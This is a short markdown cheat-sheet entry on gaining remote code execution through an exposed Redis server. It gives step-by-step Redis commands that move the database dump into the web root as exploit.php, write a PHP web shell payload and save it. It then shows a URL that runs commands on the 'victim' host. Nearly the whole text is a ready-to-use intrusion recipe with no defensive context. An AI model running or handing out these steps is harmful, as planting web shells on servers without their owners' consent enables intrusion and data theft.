# Redis Remote Code Execution
This method allows us to create a vulnerable webpage on the victim's webserver.

For this to work we'll need two things:
  1. An access to the victim's redis server. (can be anonymous user as well)
  2. The location of the webserver on the victim's machine.
  
 ## Steps:
 - connect to redis and run the following commands.
 - `config set dir /var/www/html` (change the location if needed)
 - `config set dbfilename exploit.php`
 - `set payload <?php system($_GET['cmd']) ?>` (just a simple example for a payload)
 - `save`
 
Now you can go to the website's url and run the exploit.

For Example:
  - https://victim-url/exploit.php?cmd=whoami
